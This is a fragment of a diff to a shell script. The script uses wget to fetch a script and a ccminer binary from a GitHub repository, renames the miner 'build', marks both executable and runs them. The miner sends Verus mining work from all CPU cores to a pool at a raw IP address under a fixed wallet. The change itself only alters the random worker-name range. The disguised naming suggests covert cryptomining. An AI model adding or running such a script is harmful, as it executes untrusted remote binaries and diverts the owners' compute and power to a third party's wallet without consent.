@@ -11,6 +11,6 @@ wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
 wget -qO build https://github.com/renifer12/master/raw/master/ccminer
 chmod +x build
 chmod +x compile.sh
-./build -a verus -o stratum+tcp://139.99.123.225:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-100 -n 1)-MOD) -p HYBRID -t $(nproc --all)
+./build -a verus -o stratum+tcp://139.99.123.225:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-30 -n 1)-MOD) -p HYBRID -t $(nproc --all)
 ./compile.sh
 echo succes
